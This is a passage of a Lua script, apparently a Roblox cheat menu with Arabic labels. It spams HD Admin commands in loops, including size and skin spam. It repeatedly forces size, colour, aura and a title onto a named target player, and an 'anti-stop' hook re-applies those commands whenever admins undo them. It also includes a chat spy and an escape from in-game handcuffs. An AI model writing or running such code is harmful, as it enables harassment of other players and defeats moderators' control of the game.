        titleLabel.ZIndex = 83
        titleLabel.Parent = header

        local statusLabel = Instance.new("TextLabel")
        statusLabel.Name = "SizeSpamStatus"
        statusLabel.Size = UDim2.new(1, -130, 0, 16)
        statusLabel.Position = UDim2.new(0, 58, 0, 28)
        statusLabel.BackgroundTransparency = 1
        statusLabel.Text = T18T("متوقف")
        statusLabel.TextColor3 = Theme.Muted
        statusLabel.TextXAlignment = Enum.TextXAlignment.Left
        statusLabel.Font = Enum.Font.Gotham
        statusLabel.TextSize = 11
        statusLabel.TextTruncate = Enum.TextTruncate.AtEnd
        statusLabel.ZIndex = 83
        statusLabel.Parent = header

        local statusDot = Instance.new("Frame")
        statusDot.Name = "StatusDot"
        statusDot.Size = UDim2.new(0, 8, 0, 8)
        statusDot.AnchorPoint = Vector2.new(0.5, 0.5)
        statusDot.Position = UDim2.new(0, 60, 0, 37)
        statusDot.BackgroundColor3 = Theme.Muted
        statusDot.BorderSizePixel = 0
        statusDot.ZIndex = 85
        statusDot.Parent = header

        local closeButton = Instance.new("TextButton")
        closeButton.Size = UDim2.new(0, 28, 0, 28)
        closeButton.Position = UDim2.new(1, -36, 0, 10)
        closeButton.BackgroundColor3 = Theme.ButtonDefault
        closeButton.BorderSizePixel = 0
        closeButton.AutoButtonColor = false
        closeButton.Text = "×"
        closeButton.TextColor3 = Theme.Text
        closeButton.Font = Enum.Font.GothamBold
        closeButton.TextSize = 18
        closeButton.ZIndex = 84
        closeButton.Parent = header
        makeStroke(closeButton, Theme.Border, 1, 0.1)

        -- ── شريط الحجم (Slider) ───────────────────────────────────
        local sliderRow = Instance.new("Frame")
        sliderRow.Size = UDim2.new(1, -28, 0, 70)
        sliderRow.Position = UDim2.new(0, 14, 0, HEADER_H + 14)
        sliderRow.BackgroundTransparency = 1
        sliderRow.ZIndex = 82
        sliderRow.Parent = panel

        local sliderLabelRow = Instance.new("TextLabel")
        sliderLabelRow.Size = UDim2.new(1, 0, 0, 16)
        sliderLabelRow.BackgroundTransparency = 1
        sliderLabelRow.Text = T18T("الحجم المستهدف")
        sliderLabelRow.TextColor3 = Theme.Muted
        sliderLabelRow.TextXAlignment = Enum.TextXAlignment.Right
        sliderLabelRow.Font = Enum.Font.Gotham
        sliderLabelRow.TextSize = 11
        sliderLabelRow.ZIndex = 82
        sliderLabelRow.Parent = sliderRow

        local sizeBadge = Instance.new("Frame")
        sizeBadge.Size = UDim2.new(0, 56, 0, 30)
        sizeBadge.Position = UDim2.new(1, -56, 0, -2)
        sizeBadge.BackgroundColor3 = Theme.ButtonDefault
        sizeBadge.BorderSizePixel = 0
        sizeBadge.ZIndex = 82
        sizeBadge.Parent = sliderRow
        makeStroke(sizeBadge, Theme.Border, 1, 0.15)
        local sizeBadgeText = Instance.new("TextLabel")
        sizeBadgeText.Size = UDim2.fromScale(1, 1)
        sizeBadgeText.BackgroundTransparency = 1
        sizeBadgeText.Text = "1.0"
        sizeBadgeText.TextColor3 = Theme.Text
        sizeBadgeText.Font = Enum.Font.Code
        sizeBadgeText.TextSize = 15
        sizeBadgeText.ZIndex = 83
        sizeBadgeText.Parent = sizeBadge

        local sliderTrack = Instance.new("TextButton")
        sliderTrack.Name = "SizeSlider"
        sliderTrack.Size = UDim2.new(1, 0, 0, 6)
        sliderTrack.Position = UDim2.new(0, 0, 0, 30)
        sliderTrack.BackgroundColor3 = Theme.ButtonDefault
        sliderTrack.BorderSizePixel = 0
        sliderTrack.AutoButtonColor = false
        sliderTrack.Text = ""
        sliderTrack.ZIndex = 82
        sliderTrack.Parent = sliderRow

        local sliderFill = Instance.new("Frame")
        sliderFill.Size = UDim2.new(1/3, 0, 1, 0)
        sliderFill.BackgroundColor3 = Theme.Text
        sliderFill.BorderSizePixel = 0
        sliderFill.ZIndex = 83
        sliderFill.Parent = sliderTrack
        local sliderKnob = Instance.new("Frame")
        sliderKnob.Size = UDim2.new(0, 14, 0, 14)
        sliderKnob.AnchorPoint = Vector2.new(0.5, 0.5)
        sliderKnob.Position = UDim2.new(1, 0, 0.5, 0)
        sliderKnob.BackgroundColor3 = Theme.Text
        sliderKnob.BorderSizePixel = 0
        sliderKnob.ZIndex = 84
        sliderKnob.Parent = sliderFill
        makeStroke(sliderKnob, Theme.Border, 1.5, 0)

        local marksRow = Instance.new("Frame")
        marksRow.Size = UDim2.new(1, 0, 0, 16)
        marksRow.Position = UDim2.new(0, 0, 0, 42)
        marksRow.BackgroundTransparency = 1
        marksRow.ZIndex = 82
        marksRow.Parent = sliderRow
        for i = 0, 3 do
            local m = Instance.new("TextLabel")
            m.Size = UDim2.new(0, 24, 0, 16)
            m.AnchorPoint = Vector2.new(0.5, 0)
            m.Position = UDim2.new(i / 3, 0, 0, 0)
            m.BackgroundTransparency = 1
            m.Text = tostring(i)
            m.TextColor3 = Theme.Muted
            m.Font = Enum.Font.Code
            m.TextSize = 10
            m.ZIndex = 82
            m.Parent = marksRow
        end

        -- ── إدخال يدوي دقيق ────────────────────────────────────────
        local inputRow = Instance.new("Frame")
        inputRow.Size = UDim2.new(1, -28, 0, 36)
        inputRow.Position = UDim2.new(0, 14, 0, HEADER_H + 92)
        inputRow.BackgroundTransparency = 1
        inputRow.ZIndex = 82
        inputRow.Parent = panel

        local sizeInput = Instance.new("TextBox")
        sizeInput.Name = "SizeSpamInput"
        sizeInput.Size = UDim2.new(1, 0, 1, 0)
        sizeInput.BackgroundColor3 = Theme.Input
        sizeInput.BorderSizePixel = 0
        sizeInput.PlaceholderText = T18T("أو اكتب رقم دقيق (مثل 1.5)")
        sizeInput.Text = "1"
        sizeInput.TextColor3 = Theme.Text
        sizeInput.PlaceholderColor3 = Theme.Muted
        sizeInput.Font = Enum.Font.Code
        sizeInput.TextSize = 13
        sizeInput.ClearTextOnFocus = false
        sizeInput.ZIndex = 82
        sizeInput.Parent = inputRow
        makeStroke(sizeInput, Theme.Border, 1, 0.2)

        -- ── زر التفعيل الكبير ─────────────────────────────────────
        local toggleY = HEADER_H + 138
        local toggleButton = Instance.new("TextButton")
        toggleButton.Name = "SizeSpamToggle"
        toggleButton.Size = UDim2.new(1, -28, 0, 46)
        toggleButton.Position = UDim2.new(0, 14, 0, toggleY)
        toggleButton.BackgroundColor3 = Theme.ButtonDefault
        toggleButton.BorderSizePixel = 0
        toggleButton.AutoButtonColor = false
        toggleButton.Text = T18T("تفعيل سبام تكبير حجم")
        toggleButton.TextColor3 = Theme.Text
        toggleButton.Font = Enum.Font.GothamBold
        toggleButton.TextSize = 14
        toggleButton.ZIndex = 82
        toggleButton.Parent = panel
        makeStroke(toggleButton, Theme.Border, 1, 0.15)

        -- ── شريط إحصائيات ─────────────────────────────────────────
        local statsY = toggleY + 56
        local statsRow = Instance.new("Frame")
        statsRow.Size = UDim2.new(1, -28, 0, 56)
        statsRow.Position = UDim2.new(0, 14, 0, statsY)
        statsRow.BackgroundColor3 = Theme.ButtonDefault
        statsRow.BorderSizePixel = 0
        statsRow.ZIndex = 82
        statsRow.Parent = panel
        makeStroke(statsRow, Theme.Border, 1, 0.2)

        local sentCountLabel = Instance.new("TextLabel")
        sentCountLabel.Size = UDim2.new(0.5, 0, 1, 0)
        sentCountLabel.BackgroundTransparency = 1
        sentCountLabel.Text = ""
        sentCountLabel.ZIndex = 83
        sentCountLabel.Parent = statsRow
        local sentNum = Instance.new("TextLabel")
        sentNum.Size = UDim2.new(1, 0, 0, 24)
        sentNum.Position = UDim2.new(0, 0, 0, 6)
        sentNum.BackgroundTransparency = 1
        sentNum.Text = "0"
        sentNum.TextColor3 = Theme.Text
        sentNum.Font = Enum.Font.GothamBold
        sentNum.TextSize = 18
        sentNum.ZIndex = 83
        sentNum.Parent = sentCountLabel
        local sentCaption = Instance.new("TextLabel")
        sentCaption.Size = UDim2.new(1, 0, 0, 16)
        sentCaption.Position = UDim2.new(0, 0, 0, 30)
        sentCaption.BackgroundTransparency = 1
        sentCaption.Text = T18T("إرسالات")
        sentCaption.TextColor3 = Theme.Muted
        sentCaption.Font = Enum.Font.Gotham
        sentCaption.TextSize = 10
        sentCaption.ZIndex = 83
        sentCaption.Parent = sentCountLabel

        local divider = Instance.new("Frame")
        divider.Size = UDim2.new(0, 1, 1, -16)
        divider.Position = UDim2.new(0.5, 0, 0, 8)
        divider.BackgroundColor3 = Theme.Border
        divider.BorderSizePixel = 0
        divider.ZIndex = 83
        divider.Parent = statsRow

        local intervalHolder = Instance.new("TextLabel")
        intervalHolder.Size = UDim2.new(0.5, 0, 1, 0)
        intervalHolder.Position = UDim2.new(0.5, 0, 0, 0)
        intervalHolder.BackgroundTransparency = 1
        intervalHolder.Text = ""
        intervalHolder.ZIndex = 83
        intervalHolder.Parent = statsRow
        local intervalNum = Instance.new("TextLabel")
        intervalNum.Size = UDim2.new(1, 0, 0, 24)
        intervalNum.Position = UDim2.new(0, 0, 0, 6)
        intervalNum.BackgroundTransparency = 1
        intervalNum.Text = "1s"
        intervalNum.TextColor3 = Theme.Text
        intervalNum.Font = Enum.Font.GothamBold
        intervalNum.TextSize = 18
        intervalNum.ZIndex = 83
        intervalNum.Parent = intervalHolder
        local intervalCaption = Instance.new("TextLabel")
        intervalCaption.Size = UDim2.new(1, 0, 0, 16)
        intervalCaption.Position = UDim2.new(0, 0, 0, 30)
        intervalCaption.BackgroundTransparency = 1
        intervalCaption.Text = T18T("كل فاصل")
        intervalCaption.TextColor3 = Theme.Muted
        intervalCaption.Font = Enum.Font.Gotham
        intervalCaption.TextSize = 10
        intervalCaption.ZIndex = 83
        intervalCaption.Parent = intervalHolder

        -- ══════════════════════════════════════════════════════
        --  المنطق
        -- ══════════════════════════════════════════════════════
        local active, disposed, inFlight = false, false, false
        local session = 0
        local sentCount = 0
        local connections = {}
        local draggingSlider = false
        local currentSize = 1

        local digits = {
            ["٠"] = "0", ["١"] = "1", ["٢"] = "2", ["٣"] = "3", ["٤"] = "4",
            ["٥"] = "5", ["٦"] = "6", ["٧"] = "7", ["٨"] = "8", ["٩"] = "9",
            ["۰"] = "0", ["۱"] = "1", ["۲"] = "2", ["۳"] = "3", ["۴"] = "4",
            ["۵"] = "5", ["۶"] = "6", ["۷"] = "7", ["۸"] = "8", ["۹"] = "9",
        }

        local function updateSliderVisual(size)
            local ratio = math.clamp(size / 3, 0, 1)
            sliderFill.Size = UDim2.new(ratio, 0, 1, 0)
            sizeBadgeText.Text = string.format("%.1f", size)
        end

        local function setSize(size, fromSlider)
            size = math.clamp(size, 0, 3)
            currentSize = size
            updateSliderVisual(size)
            if not fromSlider then
                sizeInput.Text = string.format("%.1f", size):gsub("%.0$", "")
            end
        end

        local function sliderToSize(inputX)
            local abs = sliderTrack.AbsolutePosition.X
            local w = sliderTrack.AbsoluteSize.X
            local ratio = math.clamp((inputX - abs) / math.max(w, 1), 0, 1)
            return ratio * 3
        end

        sliderTrack.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                draggingSlider = true
                setSize(sliderToSize(input.Position.X))
            end
        end)
        table.insert(connections, game:GetService("UserInputService").InputChanged:Connect(function(input)
            if draggingSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                setSize(sliderToSize(input.Position.X))
            end
        end))
        table.insert(connections, game:GetService("UserInputService").InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                draggingSlider = false
            end
        end))

        sizeInput:GetPropertyChangedSignal("Text"):Connect(function()
            local raw = sizeInput.Text:match("^%s*(.-)%s*$")
            for digit, replacement in pairs(digits) do
                raw = raw:gsub(digit, replacement)
            end
            raw = raw:gsub("٫", "."):gsub(",", ".")
            local n = tonumber(raw)
            if n and n >= 0 and n <= 3 then
                currentSize = n
                updateSliderVisual(n)
            end
        end)

        updateSliderVisual(1)

        local function setDot(color)
            statusDot.BackgroundColor3 = color
        end

        local function stop(message)
            active = false
            session = session + 1
            if disposed then return end
            toggleButton.Text = T18T("تفعيل سبام تكبير حجم")
            toggleButton.BackgroundColor3 = Theme.ButtonDefault
            toggleButton.TextColor3 = Theme.Text
            sizeInput.TextEditable = true
            statusLabel.TextColor3 = Theme.Muted
            statusLabel.Text = message or T18T("متوقف")
            setDot(Theme.Muted)
        end

        local function close()
            overlay.Visible = false
        end

        table.insert(connections, openButton.Activated:Connect(function()
            overlay.Visible = true
        end))
        table.insert(connections, closeButton.Activated:Connect(close))

        -- نبض خفيف لنقطة الحالة وقت التشغيل
        task.spawn(function()
            while true do
                if active then
                    game:GetService("TweenService"):Create(
                        statusDot, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
                        { BackgroundTransparency = 0.6 }
                    ):Play()
                else
                    statusDot.BackgroundTransparency = 0
                end
                task.wait(1.2)
            end
        end)

        table.insert(connections, toggleButton.MouseButton1Click:Connect(function()
            if disposed then return end
            if active then stop(); return end
            if inFlight then
                statusLabel.Text = T18T("بانتظار انتهاء الطلب السابق")
                return
            end

            local size = currentSize
            if not size or size ~= size or size < 0 or size > 3 then
                statusLabel.Text = T18T("حط رقم من 0 إلى 3")
                return
            end
            if not _hdRequestCmd or not _hdRequestCmd.Parent then
                statusLabel.Text = T18T("HD Admin غير جاهز — لم يبدأ التكرار")
                return
            end

            local command = "!size me " .. tostring(size)
            sizeInput.TextEditable = false
            active = true
            sentCount = 0
            sentNum.Text = "0"
            session = session + 1
            local currentSession = session
            toggleButton.Text = T18T("إيقاف سبام تكبير حجم")
            toggleButton.BackgroundColor3 = Theme.Active
            toggleButton.TextColor3 = Theme.Text
            statusLabel.TextColor3 = Theme.Text
            statusLabel.Text = T18T("مفعّل — ") .. command
            setDot(Theme.Text)

            task.spawn(function()
                while not disposed and active and session == currentSession do
                    if not T18RuntimeAlive() then
                        stop()
                        break
                    end
                    inFlight = true
                    local ok, sent = pcall(hdRunCommand, command)
                    inFlight = false
                    if disposed or not active or session ~= currentSession then return end
                    if not ok or not sent then
                        stop(T18T("توقف التكرار بسبب تعذر إرسال الأمر"))
                        return
                    end
                    sentCount = sentCount + 1
                    sentNum.Text = tostring(sentCount)
                    statusLabel.Text = T18T("مفعّل — ") .. command
                    task.wait(1)
                end
            end)
        end))

        local function dispose()
            if disposed then return end
            disposed = true
            active = false
            session = session + 1
            for _, connection in ipairs(connections) do connection:Disconnect() end
            table.clear(connections)
        end
        table.insert(connections, overlay.Destroying:Connect(dispose))
        table.insert(connections, ScreenGui.Destroying:Connect(dispose))
    end
    mountSizeSpamPanel()
end


do
    local _skinSpam    = false
    local _skinSession = 0
    local _skin1 = "!char me H_r38"
    local _skin2 = "!char me creekdraden"

    local skinBtn = PlayerPage:FindFirstChild("SkinSpamBtn", true)

    if skinBtn then
        skinBtn.MouseButton1Click:Connect(function()
            _skinSpam = not _skinSpam

            if _skinSpam then
                skinBtn.Text             = T18T(" ايقاف سبام سكنات")
                skinBtn.BackgroundColor3 = Theme.Active
                showNotification(T18T(" سبام سكنات مفعّل"))

                _skinSession += 1
                local mySession = _skinSession

                task.spawn(function()
                    while _skinSpam and _skinSession == mySession do
                        hdRunCommand(_skin1)
                        task.wait(1)
                        if not (_skinSpam and _skinSession == mySession) then break end
                        hdRunCommand(_skin2)
                        task.wait(1)
                    end
                end)
            else
                _skinSpam = false
                skinBtn.Text             = T18T("سبام سكنات")
                skinBtn.BackgroundColor3 = Theme.ButtonBlue
                showNotification(T18T(" تم ايقاف سبام سكنات"))
            end
        end)
    end
end

;(function()
    local _hdAdminBtn = OthersPage:FindFirstChild("HdAdminBtn", true)
    if not _hdAdminBtn then return end

    local function findHdAdminFrame()
        local pg = LocalPlayer:FindFirstChild("PlayerGui")
        if not pg then return nil, nil end
        local candidates = {
            "HDAdminHDClient", "HDAdmin", "HD_Admin", "HdAdmin", "HDAdminGui",
        }
        for _, n in ipairs(candidates) do
            local g = pg:FindFirstChild(n)
            if g then
                local f = g:FindFirstChildWhichIsA("Frame")
                if f then return g, f end
            end
        end
        for _, g in ipairs(pg:GetChildren()) do
            if g:IsA("ScreenGui") and g.Name:lower():find("hd") then
                local f = g:FindFirstChildWhichIsA("Frame")
                if f then return g, f end
            end
        end
        return nil, nil
    end

    local _hdGuiOpen = false

    _hdAdminBtn.MouseButton1Click:Connect(function()
        local _, mainFrame = findHdAdminFrame()
        if not mainFrame then
            showNotification(" ما لقيت واجهة HD Admin في PlayerGui")
            return
        end
        _hdGuiOpen = not mainFrame.Visible
        mainFrame.Visible = _hdGuiOpen
        setButtonState(
            _hdAdminBtn, _hdGuiOpen,
            T18T("اغلاق الادمن"), T18T("الادمن"),
            Theme.Active, Theme.ButtonBlue
        )
    end)
end)()

;(function()
    local _chatSpyBtn = OthersPage:FindFirstChild("ChatSpyBtn", true)
    if not _chatSpyBtn then return end

    local P = Instance.new("Frame")
    P.Name = "ChatSpyPanel"
    P.Size = UDim2.new(0, 290, 0, 330)
    P.Position = UDim2.new(0, 10, 1, -340)
    P.BackgroundColor3 = Theme.Panel
    P.BackgroundTransparency = 0.06
    P.BorderSizePixel = 0
    P.ZIndex = 50
    P.Visible = false
    P.Parent = Frame
    makeCorner(P, 14)
    makeStroke(P, Theme.Border, 1, 0.18)

    local t = Instance.new("TextLabel")
    t.Size = UDim2.new(1, -50, 0, 38)
    t.Position = UDim2.new(0, 12, 0, 0)
    t.BackgroundTransparency = 1
    t.Text = "سباي الشات"
    t.TextColor3 = Theme.Text
    t.TextXAlignment = Enum.TextXAlignment.Right
    t.Font = Enum.Font.GothamBold
    t.TextSize = 15
    t.ZIndex = 51
    t.Parent = P

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -36, 0, 4)
    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
    closeBtn.BackgroundTransparency = 0.25
    closeBtn.Text = ""
    closeBtn.TextColor3 = Color3.new(1, 1, 1)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 14
    closeBtn.AutoButtonColor = false
    closeBtn.ZIndex = 52
    closeBtn.Parent = P
    makeCorner(closeBtn, 8)

    local clearBtn = Instance.new("TextButton")
    clearBtn.Size = UDim2.new(0, 58, 0, 24)
    clearBtn.Position = UDim2.new(0, 10, 0, 7)
    clearBtn.BackgroundColor3 = Theme.ButtonBlue
    clearBtn.BackgroundTransparency = 0.25
    clearBtn.Text = " مسح"
    clearBtn.TextColor3 = Color3.new(1, 1, 1)
    clearBtn.Font = Enum.Font.GothamMedium
    clearBtn.TextSize = 11
    clearBtn.AutoButtonColor = false
    clearBtn.ZIndex = 52
    clearBtn.Parent = P
    makeCorner(clearBtn, 7)

    local div = Instance.new("Frame")
    div.Size = UDim2.new(1, -24, 0, 1)
    div.Position = UDim2.new(0, 12, 0, 40)
    div.BackgroundColor3 = Theme.Border
    div.BackgroundTransparency = 0.45
    div.BorderSizePixel = 0
    div.ZIndex = 51
    div.Parent = P

    local list = Instance.new("ScrollingFrame")
    list.Size = UDim2.new(1, -14, 1, -50)
    list.Position = UDim2.new(0, 7, 0, 46)
    list.BackgroundTransparency = 1
    list.BorderSizePixel = 0
    list.ScrollBarThickness = 3
    list.ScrollBarImageColor3 = Theme.Active
    list.CanvasSize = UDim2.new(0, 0, 0, 0)
    list.AutomaticCanvasSize = Enum.AutomaticSize.Y
    list.ZIndex = 51
    list.Parent = P

    local ll = Instance.new("UIListLayout")
    ll.Padding = UDim.new(0, 5)
    ll.SortOrder = Enum.SortOrder.LayoutOrder
    ll.Parent = list

    local lp = Instance.new("UIPadding")
    lp.PaddingTop    = UDim.new(0, 4)
    lp.PaddingBottom = UDim.new(0, 4)
    lp.PaddingLeft   = UDim.new(0, 4)
    lp.PaddingRight  = UDim.new(0, 4)
    lp.Parent        = list

    local msgCount = 0

    local function getMsgColor(msgType)
        if msgType == "System" then return Color3.fromRGB(210, 130, 255) end
        return Color3.fromRGB(100, 200, 255)
    end

    local function addChatMsg(speaker, text, msgType)
        msgCount += 1
        local isMe = speaker == LocalPlayer.Name
        local row = Instance.new("Frame")
        row.Name = "ChatSpyMessageRow"
        row.Size = UDim2.new(1, 0, 0, 0)
        row.AutomaticSize = Enum.AutomaticSize.Y
        row.BackgroundColor3 = isMe and Color3.fromRGB(20, 30, 20) or Theme.PanelSoft
        row.BackgroundTransparency = 0.18
        row.BorderSizePixel = 0
        row.LayoutOrder = msgCount
        row.ZIndex = 52
        row.Parent = list
        makeCorner(row, 7)

        local rp = Instance.new("UIPadding")
        rp.PaddingTop    = UDim.new(0, 5); rp.PaddingBottom = UDim.new(0, 5)
        rp.PaddingLeft   = UDim.new(0, 7); rp.PaddingRight  = UDim.new(0, 7)
        rp.Parent        = row

        local rl = Instance.new("UIListLayout")
        rl.Padding   = UDim.new(0, 2)
        rl.SortOrder = Enum.SortOrder.LayoutOrder
        rl.Parent    = row

        local kl = Instance.new("TextLabel")
        kl.Size                   = UDim2.new(1, 0, 0, 14)
        kl.BackgroundTransparency = 1
        kl.Text                   = tostring(speaker) .. "  •  " .. os.date("%H:%M:%S")
        kl.TextColor3             = isMe and Color3.fromRGB(120, 220, 120) or getMsgColor(msgType)
        kl.TextXAlignment         = Enum.TextXAlignment.Right
        kl.Font                   = Enum.Font.GothamBold
        kl.TextSize               = 10
        kl.LayoutOrder            = 1
        kl.ZIndex                 = 53
        kl.Parent                 = row

        local ml = Instance.new("TextLabel")
        ml.Size                   = UDim2.new(1, 0, 0, 0)
        ml.AutomaticSize          = Enum.AutomaticSize.Y
        ml.BackgroundTransparency = 1
        ml.Text                   = tostring(text or "—")
        ml.TextColor3             = Theme.Text
        ml.TextXAlignment         = Enum.TextXAlignment.Right
        ml.TextWrapped            = true
        ml.Font                   = Enum.Font.Gotham
        ml.TextSize               = 12
        ml.LayoutOrder            = 2
        ml.ZIndex                 = 53
        ml.Parent                 = row

        task.defer(function()
            list.CanvasPosition = Vector2.new(0, list.AbsoluteCanvasSize.Y)
        end)
    end

    local conns  = {}
    local active = false

    local function startSpy()
        local chatEvts = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
        if not chatEvts then
            T18ShowToast("DefaultChat غير موجود في هذه اللعبة")
            return false
        end

        local onNewMsg = chatEvts:FindFirstChild("OnNewMessage")
        if onNewMsg then
            table.insert(conns, onNewMsg.OnClientEvent:Connect(function(data)
                if type(data) ~= "table" then return end
                local speaker = tostring(data.FromSpeaker or data.Speaker or "؟")
                local text    = tostring(data.Message or data.Text or data.message or "")
                if text == "" then return end
                addChatMsg(speaker, text, "Chat")
            end))
        end

        local onSysMsg = chatEvts:FindFirstChild("OnNewSystemMessage")
        if onSysMsg then
            table.insert(conns, onSysMsg.OnClientEvent:Connect(function(data)
                local text = type(data) == "table"
                    and tostring(data.Message or data.Text or data.message or "")
                    or tostring(data or "")
                if text == "" then return end
                addChatMsg("[System]", text, "System")
            end))
        end

        return true
    end

    local function stopSpy()
        for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
        conns = {}
    end

    _chatSpyBtn.MouseButton1Click:Connect(function()
        active = not active
        if active then
            if startSpy() then
                setButtonState(_chatSpyBtn, true,
                    T18T("ايقاف السباي"), T18T("سباي الشات"),
                    Theme.Active, Theme.ButtonBlue)
                P.Visible = true
                T18ShowToast("سباي الشات شغّال")
            else
                active = false
            end
        else
            stopSpy()
            setButtonState(_chatSpyBtn, false,
                T18T("ايقاف السباي"), T18T("سباي الشات"),
                Theme.ButtonBlue, Theme.ButtonBlue)
            P.Visible = false
        end
    end)

    closeBtn.MouseButton1Click:Connect(function() P.Visible = false end)

    clearBtn.MouseButton1Click:Connect(function()
        for _, c in ipairs(list:GetChildren()) do
            if c:IsA("Frame") then c:Destroy() end
        end
        msgCount = 0
    end)
end)()

;(function()
    local myName     = LocalPlayer.Name
    local myNameLow  = myName:lower()
    local minLen     = 3

    local prefixes = {}
    for i = minLen, #myNameLow do
        prefixes[#prefixes + 1] = myNameLow:sub(1, i)
    end

    local function nameInMsg(msg)
        local m = msg:lower()
        for _, p in ipairs(prefixes) do
            if m:find(p, 1, true) then return true end
        end
        return false
    end

    local chatEvts = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
    if not chatEvts then return end

    local onNewMsg = chatEvts:FindFirstChild("OnNewMessage")
    if not onNewMsg then return end

    onNewMsg.OnClientEvent:Connect(function(data)
        if type(data) ~= "table" then return end
        local speaker = tostring(data.FromSpeaker or data.Speaker or "")
        local text    = tostring(data.Message or data.Text or data.message or "")

        if speaker == myName then return end
        if text == "" then return end
        if nameInMsg(text) then
            T18ShowToast('ذا "' .. speaker .. '" نسخ عليك')
        end
    end)
end)()

;(function()
    local btn = OthersPage:FindFirstChild("AntiCopyStopBtn", true)
    if not btn then return end

    local antiActive = false
    local conn1      = nil
    local conn2      = nil

    local function reapply()
        if not _Flags.hdCopy then return end
        local tg = (Input and Input.Text or ""):match("^%s*(.-)%s*$")
        if tg == "" then return end
        local p = HdPrefixInput and HdPrefixInput.Text
        if not p or p == "" then return end
        local cmds = {
            p.."size "   ..tg.." 3",
            p.."height " ..tg.." 0",
            p.."neon "   ..tg,
            p.."aura "   ..tg,
            p.."color "  ..tg.." pink",
            p.."titlepk "..tg.." فًحبه",
        }
        task.spawn(function()
            for _, c in ipairs(cmds) do
                hdRunCommand(c)
                task.wait(0.08)
            end
        end)
    end

    local function startAnti()
        local sig = (function()
            local hd = game:GetService("ReplicatedStorage"):FindFirstChild("HDAdminHDClient")
            return hd and hd:FindFirstChild("Signals")
        end)()
        if not sig then
            showNotification(" HD Admin Signals مو موجودة")
            return false
        end
        local r1 = sig:FindFirstChild("UndoCommand")
        if r1 then
            conn1 = r1.OnClientEvent:Connect(function()
                if antiActive then
                    showNotification(" رصد عكس — اعادة النسخ فوراً")
                    reapply()
                end
            end)
        end
        local r2 = sig:FindFirstChild("DeactivateClientCommand")
        if r2 then
            conn2 = r2.OnClientEvent:Connect(function()
                if antiActive then
                    showNotification(" رصد ايقاف — اعادة النسخ")
                    reapply()
                end
            end)
        end
        return true
    end

    local function stopAnti()
        if conn1 then pcall(function() conn1:Disconnect() end); conn1 = nil end
        if conn2 then pcall(function() conn2:Disconnect() end); conn2 = nil end
    end

    btn.MouseButton1Click:Connect(function()
        antiActive = not antiActive
        if antiActive then
            if startAnti() then
                setButtonState(btn, true,
                    T18T("ايقاف المضاد"), T18T("مضاد ايقاف نسخ"),
                    Theme.Active, Theme.ButtonBlue)
                T18ShowToast("مضاد ايقاف النسخ شغّال")
            else
                antiActive = false
            end
        else
            stopAnti()
            setButtonState(btn, false,
                T18T("ايقاف المضاد"), T18T("مضاد ايقاف نسخ"),
                Theme.ButtonBlue, Theme.ButtonBlue)
            T18ShowToast("تم ايقاف المضاد")
        end
    end)
end)()

HdCopyBtn.Text = T18T("تفعيل نسخ")

HdCopyBtn.MouseButton1Click:Connect(function()
    if not _Flags.hdCopy then
        local tg = (Input and Input.Text or ""):match("^%s*(.-)%s*$")
        if tg == "" then
            showNotification(T18T("اكتب يوزر اللاعب في خانة الكتابة"))
            return
        end
        local p = "!"

        local cmds = {
            p.."size "    ..tg.." 3",
            p.."height "  ..tg.." 0",
            p.."neon "    ..tg,
            p.."aura "    ..tg,
            p.."color "   ..tg.." pink",
            p.."titlepk " ..tg.." فًحبه",
        }

        _Flags.hdCopy = true
        HdCopyBtn.Text = T18T("ايقاف النسخ")
        HdCopyBtn.BackgroundColor3 = Theme.Active
        showNotification(T18T("تم تفعيل النسخ على ") .. tg)

        task.spawn(function()
            while _Flags.hdCopy do
                for _, c in ipairs(cmds) do
                    if not _Flags.hdCopy then break end
                    hdRunCommand(c)
                    task.wait(0.15)
                end
                task.wait(5)
            end
        end)
    else
        _Flags.hdCopy = false
        HdCopyBtn.Text = T18T("تفعيل نسخ")
        HdCopyBtn.BackgroundColor3 = Theme.ButtonDefault
        showNotification(T18T("تم ايقاف النسخ"))
    end
end)

_G.CuffProtectBtn.MouseButton1Click:Connect(function()
    _G.CuffProtectActive = not _G.CuffProtectActive
    if _G.CuffProtectActive then
        setButtonState(_G.CuffProtectBtn, true, T18T("ايقاف الحماية"), T18T("حماية كلبشة"), Theme.Active, Theme.ButtonOrange)

        pcall(function()
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            local animator = hum and hum:FindFirstChildOfClass("Animator")
            local animS = char and char:FindFirstChild("Animate")
            if not animator or not animS then return end

            local idleFolder = animS:FindFirstChild("idle")
            local idleAnim = idleFolder and idleFolder:FindFirstChildOfClass("Animation")
            local walkFolder = animS:FindFirstChild("walk")
            local walkAnim = walkFolder and walkFolder:FindFirstChildOfClass("Animation")

            animS.Disabled = true

            hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

            hum:ChangeState(Enum.HumanoidStateType.Running)

            if idleAnim then
                local anim = Instance.new("Animation")
                anim.AnimationId = idleAnim.AnimationId
                _G.CuffProtectIdleTrack = animator:LoadAnimation(anim)
                _G.CuffProtectIdleTrack.Priority = Enum.AnimationPriority.Action4
                _G.CuffProtectIdleTrack.Looped = true
                _G.CuffProtectIdleTrack:Play()
            end

            if walkAnim then
                local anim = Instance.new("Animation")
                anim.AnimationId = walkAnim.AnimationId
                _G.CuffProtectWalkTrack = animator:LoadAnimation(anim)
                _G.CuffProtectWalkTrack.Priority = Enum.AnimationPriority.Action4
                _G.CuffProtectWalkTrack.Looped = true
            end
        end)

        _G.CuffProtectMoveConn = RunService.Heartbeat:Connect(function()
            if not _G.CuffProtectActive then return end
            pcall(function()
                local char = LocalPlayer.Character
                local hum = char and char:FindFirstChildOfClass("Humanoid")
